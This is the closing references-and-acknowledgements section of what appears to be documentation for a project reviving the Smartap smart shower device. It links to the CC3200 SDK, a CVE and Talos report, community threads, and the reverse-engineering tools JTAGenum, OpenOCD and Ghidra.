- [CC3200 SDK Source Code](https://github.com/moyanming/CC3200SDK_1.2.0/tree/master/cc3200-sdk)

### Security Research

- [CVE-2021-21966](https://nvd.nist.gov/vuln/detail/CVE-2021-21966)
- [Talos Intelligence Report](https://talosintelligence.com/vulnerability_reports/TALOS-2021-1393)

### Certificate Information

- [Original Smartap Certificate (crt.sh)](https://crt.sh/?id=6715786779)

### Community Resources

- [Home Assistant Community Discussion](https://community.home-assistant.io/t/smartap-shower-control-getting-started-with-reverse-engineering-a-smart-home-device/358251/207)
- [bigclivedotcom's Hardware Teardown Video](https://www.youtube.com/watch?v=1zZzIOk19dI)

### Tools

- [JTAGenum](https://github.com/cyphunk/JTAGenum)
- [OpenOCD](https://openocd.org/)
- [Ghidra](https://ghidra-sre.org/)

### Related Projects

- [Smartap Project](https://github.com/muurk/smartap) - All tools and documentation for device revival

## Acknowledgements

- bigclivedotcom for the initial hardware teardown video
- The JTAGenum project for their excellent pin identification tool
- The OpenOCD project for making this investigation possible
- The Home Assistant community, particularly the contributors to the Smartap reverse engineering thread
- The broader IoT security research community for their continuous work in this field

---

<div class="grid cards" markdown>

-   :material-arrow-left-circle:{ .lg .middle } __Previous: Technical Overview__

    ---

    Learn about the system architecture and components

    [:octicons-arrow-right-24: Technical Overview](architecture.md)

-   :material-arrow-right-circle:{ .lg .middle } __Next: Protocol Documentation__

    ---

    Understand the device communication protocol

    [:octicons-arrow-right-24: Protocol Documentation](./protocol.md)

</div>
